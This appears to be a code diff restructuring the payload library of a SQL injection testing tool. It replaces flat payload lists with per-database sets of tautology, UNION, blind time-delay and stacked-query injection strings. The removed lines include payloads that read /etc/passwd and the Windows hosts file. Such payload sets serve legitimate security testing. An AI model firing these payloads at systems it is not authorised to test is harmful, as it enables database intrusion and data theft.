@@ -13,52 +13,107 @@ class PayloadManager:
             payload_file: Path to custom payload JSON file
         """
         self.payloads = {
-            "error_based": [
-                "'",
-                "''",
-                "\"",
-                "\"\"",
-                "1' OR '1'='1",
-                "1\" OR \"1\"=\"1",
-                "' OR 1=1--",
-                "\" OR 1=1--",
-                "' OR '1'='1'--",
-                "1' ORDER BY 1--",
-                "1' ORDER BY 2--",
-                "1' ORDER BY 3--",
-            ],
-            "boolean_based": [
-                "' AND 1=1--",
-                "' AND 1=2--",
-                "' OR 1=1--",
-                "' OR 1=2--",
-            ],
-            "time_based": [
-                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                "' AND (SELECT * FROM (SELECT(BENCHMARK(10000000,MD5(1))))a)--",
-            ],
-            "union_based": [
-                "' UNION SELECT NULL--",
-                "' UNION SELECT NULL,NULL--",
-                "' UNION SELECT NULL,NULL,NULL--",
-                "' UNION SELECT NULL,NULL,NULL,NULL--",
-            ],
-            "stacked_queries": [
-                "'; SELECT 1--",
-                "'; SELECT 1,2--",
-                "'; SELECT 1,2,3--",
-            ],
-            "file_operations": {
+            "error": {
                 "mysql": [
-                    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
-                    "' UNION SELECT LOAD_FILE('/etc/hosts')--",
+                    "' OR '1'='1",
+                    "' OR 1=1--",
+                    "' OR '1'='1'--",
+                    "' OR '1'='1'#",
+                    "' OR 1=1#",
+                    "' OR '1'='1'/*",
+                    "' OR 1=1/*",
+                    "' OR '1'='1'-- -",
+                    "' OR 1=1-- -",
+                    "' OR '1'='1'# -",
+                    "' OR 1=1# -"
                 ],
                 "postgresql": [
-                    "' UNION SELECT pg_read_file('/etc/passwd')--",
-                    "' UNION SELECT pg_read_file('/etc/hosts')--",
+                    "' OR '1'='1",
+                    "' OR 1=1--",
+                    "' OR '1'='1'--",
+                    "' OR '1'='1'/*",
+                    "' OR 1=1/*",
+                    "' OR '1'='1'-- -",
+                    "' OR 1=1-- -"
                 ],
                 "mssql": [
-                    "' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_BLOB) AS x--",
+                    "' OR '1'='1",
+                    "' OR 1=1--",
+                    "' OR '1'='1'--",
+                    "' OR '1'='1'/*",
+                    "' OR 1=1/*",
+                    "' OR '1'='1'-- -",
+                    "' OR 1=1-- -"
+                ]
+            },
+            "union": {
+                "mysql": [
+                    "' UNION SELECT NULL--",
+                    "' UNION SELECT NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+                ],
+                "postgresql": [
+                    "' UNION SELECT NULL--",
+                    "' UNION SELECT NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+                ],
+                "mssql": [
+                    "' UNION SELECT NULL--",
+                    "' UNION SELECT NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL--",
+                    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+                ]
+            },
+            "blind": {
+                "mysql": [
+                    "' AND 1=1--",
+                    "' AND 1=2--",
+                    "' AND '1'='1",
+                    "' AND '1'='2",
+                    "' AND SLEEP(5)--",
+                    "' AND BENCHMARK(10000000,MD5(1))--"
+                ],
+                "postgresql": [
+                    "' AND 1=1--",
+                    "' AND 1=2--",
+                    "' AND '1'='1",
+                    "' AND '1'='2",
+                    "' AND pg_sleep(5)--"
+                ],
+                "mssql": [
+                    "' AND 1=1--",
+                    "' AND 1=2--",
+                    "' AND '1'='1",
+                    "' AND '1'='2",
+                    "' AND WAITFOR DELAY '0:0:5'--"
+                ]
+            },
+            "stacked": {
+                "mysql": [
+                    "'; SELECT 1--",
+                    "'; SELECT 1,2--",
+                    "'; SELECT 1,2,3--",
+                    "'; SELECT 1,2,3,4--",
+                    "'; SELECT 1,2,3,4,5--"
+                ],
+                "postgresql": [
+                    "'; SELECT 1--",
+                    "'; SELECT 1,2--",
+                    "'; SELECT 1,2,3--",
+                    "'; SELECT 1,2,3,4--",
+                    "'; SELECT 1,2,3,4,5--"
+                ],
+                "mssql": [
+                    "'; SELECT 1--",
+                    "'; SELECT 1,2--",
+                    "'; SELECT 1,2,3--",
+                    "'; SELECT 1,2,3,4--",
+                    "'; SELECT 1,2,3,4,5--"
                 ]
             }
         }
@@ -81,59 +136,59 @@ class PayloadManager:
         except Exception as e:
             print(f"Error loading custom payloads: {str(e)}")
     
-    def get_payloads(self, category: str) -> List[str]:
-        """
-        Get payloads for a specific category.
+    def get_payloads(self, injection_type: str, db_type: Optional[str] = None) -> List[str]:
+        """Get payloads for a specific injection type and database type."""
+        if injection_type not in self.payloads:
+            return []
         
-        Args:
-            category: Payload category (error_based, boolean_based, etc.)
-            
-        Returns:
-            List of payloads for the specified category
-        """
-        return self.payloads.get(category, [])
+        if db_type and db_type in self.payloads[injection_type]:
+            return self.payloads[injection_type][db_type]
+        
+        # If no specific database type is provided, return all payloads for the injection type
+        all_payloads = []
+        for db_payloads in self.payloads[injection_type].values():
+            all_payloads.extend(db_payloads)
+        return all_payloads
     
-    def get_database_specific_payloads(self, db_type: str, category: str) -> List[str]:
-        """
-        Get database-specific payloads for a category.
+    def add_payload(self, injection_type: str, payload: str, db_type: Optional[str] = None) -> None:
+        """Add a new payload for a specific injection type and database type."""
+        if injection_type not in self.payloads:
+            self.payloads[injection_type] = {}
         
-        Args:
-            db_type: Database type (mysql, postgresql, mssql)
-            category: Payload category
-            
-        Returns:
-            List of database-specific payloads
-        """
-        if category in self.payloads and isinstance(self.payloads[category], dict):
-            return self.payloads[category].get(db_type, [])
-        return []
+        if db_type:
+            if db_type not in self.payloads[injection_type]:
+                self.payloads[injection_type][db_type] = []
+            self.payloads[injection_type][db_type].append(payload)
+        else:
+            # Add payload to all database types
+            for db_type in self.payloads[injection_type]:
+                self.payloads[injection_type][db_type].append(payload)
     
-    def add_payload(self, category: str, payload: str) -> None:
-        """
-        Add a new payload to a category.
+    def remove_payload(self, injection_type: str, payload: str, db_type: Optional[str] = None) -> None:
+        """Remove a payload for a specific injection type and database type."""
+        if injection_type not in self.payloads:
+            return
         
-        Args:
-            category: Payload category
-            payload: New payload to add
-        """
-        if category not in self.payloads:
-            self.payloads[category] = []
-        self.payloads[category].append(payload)
+        if db_type and db_type in self.payloads[injection_type]:
+            if payload in self.payloads[injection_type][db_type]:
+                self.payloads[injection_type][db_type].remove(payload)
+        else:
+            # Remove payload from all database types
+            for db_type in self.payloads[injection_type]:
+                if payload in self.payloads[injection_type][db_type]:
+                    self.payloads[injection_type][db_type].remove(payload)
     
-    def add_database_specific_payload(self, db_type: str, category: str, payload: str) -> None:
-        """
-        Add a database-specific payload.
-        
-        Args:
-            db_type: Database type
-            category: Payload category
-            payload: New payload to add
-        """
-        if category not in self.payloads:
-            self.payloads[category] = {}
-        if db_type not in self.payloads[category]:
-            self.payloads[category][db_type] = []
-        self.payloads[category][db_type].append(payload)
+    def clear_payloads(self, injection_type: Optional[str] = None, db_type: Optional[str] = None) -> None:
+        """Clear all payloads or payloads for a specific injection type and database type."""
+        if injection_type:
+            if db_type:
+                if injection_type in self.payloads and db_type in self.payloads[injection_type]:
+                    self.payloads[injection_type][db_type] = []
+            else:
+                if injection_type in self.payloads:
+                    self.payloads[injection_type] = {}
+        else:
+            self.payloads = {}
     
     def save_payloads(self, output_file: str) -> None:
         """
